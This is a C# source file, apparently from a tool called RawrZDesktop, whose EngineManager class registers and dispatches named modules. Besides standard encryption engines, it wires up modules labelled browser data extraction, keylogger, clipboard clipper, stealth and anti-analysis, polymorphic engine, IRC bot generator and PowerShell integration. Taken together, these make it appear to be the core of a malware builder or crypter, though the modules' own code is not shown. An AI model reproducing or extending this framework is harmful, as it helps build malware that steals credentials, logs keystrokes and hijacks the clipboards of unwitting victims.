using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace RawrZDesktop.Engines
{
    public class EngineManager
    {
        private readonly Dictionary<string, IEngine> _engines;

        public EngineManager()
        {
            _engines = new Dictionary<string, IEngine>();
            InitializeEngines();
        }

        private void InitializeEngines()
        {
            // Core Encryption Engines (REAL IMPLEMENTATIONS ONLY)
            _engines["AES-256"] = new AesEngine(256);
            _engines["AES-128"] = new AesEngine(128);
            _engines["AES-256-GCM"] = new AesGcmEngine(256);
            _engines["AES-128-GCM"] = new AesGcmEngine(128);
            _engines["ChaCha20-Poly1305"] = new ChaCha20Poly1305Engine();
            _engines["Hardware-AES-256"] = new HardwareAcceleratedAesEngine(256);
            _engines["Hardware-AES-128"] = new HardwareAcceleratedAesEngine(128);

            // System & Performance (REAL IMPLEMENTATIONS ONLY)
            _engines["Argon2"] = new Argon2Engine();
            _engines["Parallel-AES-256"] = new ParallelProcessingEngine(new AesEngine(256));
            _engines["Parallel-ChaCha20-Poly1305"] = new ParallelProcessingEngine(new ChaCha20Poly1305Engine());
            _engines["Streaming-AES-256"] = new StreamingEncryptionEngine(new AesEngine(256));
            _engines["Streaming-ChaCha20-Poly1305"] = new StreamingEncryptionEngine(new ChaCha20Poly1305Engine());

            // Modern Crypto (REAL IMPLEMENTATIONS ONLY)
            _engines["ModernCrypto"] = new ModernCryptoEngine();

            // Advanced Engines (REAL IMPLEMENTATIONS ONLY)
            _engines["StealthArchitecture"] = new StealthArchitectureEngine();
            _engines["SystemProfiling"] = new SystemProfilingEngine();
            _engines["SecureCommunication"] = new SecureCommunicationEngine();
            _engines["BrowserDataExtraction"] = new BrowserDataExtractionEngine();
            _engines["Keylogger"] = new KeyloggerEngine();
            _engines["ClipperModule"] = new ClipperEngine();
            _engines["PowerShellIntegration"] = new PowerShellEngine();

            // Stealth & Anti-Analysis (REAL IMPLEMENTATIONS ONLY)
            _engines["StealthEngine"] = new StealthEngine();

            // Polymorphic & Metamorphic (REAL IMPLEMENTATIONS ONLY)
            _engines["PolymorphicEngine"] = new PolymorphicEngine();

            // Bot Generators (REAL IMPLEMENTATIONS ONLY)
            _engines["IrcBotGenerator"] = new IrcBotEngine();

            // System & Performance (REAL IMPLEMENTATIONS ONLY)
            _engines["CompressionEngine"] = new CompressionEngine();
        }

        public IEnumerable<string> GetAvailableEngines()
        {
            return _engines.Keys;
        }

        public IEngine? GetEngine(string name)
        {
            return _engines.TryGetValue(name, out var engine) ? engine : null;
        }

        public async Task<EngineResult> ExecuteEngine(string engineName, Dictionary<string, object> parameters)
        {
            if (!_engines.TryGetValue(engineName, out var engine))
            {
                return new EngineResult
                {
                    Success = false,
                    Error = $"Engine '{engineName}' not found"
                };
            }

            try
            {
                return await engine.ExecuteAsync(parameters);
            }
            catch (Exception ex)
            {
                return new EngineResult
                {
                    Success = false,
                    Error = ex.Message
                };
            }
        }

        public async Task<EngineResult> EncryptWithEngine(string engineName, byte[] data, string filelessKey, Dictionary<string, object>? options = null)
        {
            var parameters = new Dictionary<string, object>
            {
                ["operation"] = "encrypt",
                ["data"] = data,
                ["fileless_key"] = filelessKey,
                ["options"] = options ?? new Dictionary<string, object>()
            };
            return await ExecuteEngine(engineName, parameters);
        }

        public async Task<EngineResult> DecryptWithEngine(string engineName, byte[] data, string filelessKey, Dictionary<string, object>? options = null)
        {
            var parameters = new Dictionary<string, object>
            {
                ["operation"] = "decrypt",
                ["data"] = data,
                ["fileless_key"] = filelessKey,
                ["options"] = options ?? new Dictionary<string, object>()
            };
            return await ExecuteEngine(engineName, parameters);
        }

        public bool HasEngine(string engineName)
        {
            return _engines.ContainsKey(engineName);
        }

        public int GetEngineCount()
        {
            return _engines.Count;
        }

        public Dictionary<string, string> GetEngineInfo()
        {
            var info = new Dictionary<string, string>();
            foreach (var kvp in _engines)
            {
                info[kvp.Key] = $"{kvp.Value.Description} (v{kvp.Value.Version})";
            }
            return info;
        }
    }
}